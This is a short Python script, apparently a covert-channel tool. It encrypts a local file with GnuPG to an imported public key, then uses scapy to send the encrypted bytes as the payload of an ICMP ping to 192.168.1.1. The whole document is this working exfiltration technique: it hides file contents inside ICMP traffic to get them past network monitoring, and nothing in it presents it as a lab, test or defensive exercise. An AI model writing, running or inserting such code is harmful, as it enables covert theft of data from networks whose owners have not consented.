import gnupg
from scapy.all import *

gpg = gnupg.GPG()

with open('chave_publica.asc', 'r') as f:
    import_result = gpg.import_keys(f.read())
    print("Import result:", import_result)

recipient_fingerprint = import_result.fingerprints[0]
print("Recipient's fingerprint:", recipient_fingerprint)

def encrypt_file(input_file, output_file, recipient_fingerprint):
    with open(input_file, 'rb') as f:
        file_data = f.read()
        
        encrypted_data = gpg.encrypt(file_data, recipient_fingerprint)
        
        if encrypted_data.ok:
            with open(output_file, 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data.data)
            print("File encrypted successfully!")
        else:
            print("Encryption failed:", encrypted_data.status)

input_file = 'original.txt'  
output_file = 'criptografado.gpg'  

encrypt_file(input_file, output_file, recipient_fingerprint)

def send_ping_payload(dest_ip, payload):
    packet = IP(dst=dest_ip)/ICMP()/Raw(load=payload)
    send(packet)

with open(output_file, 'rb') as f:
    data = f.read()

send_ping_payload("192.168.1.1", data)

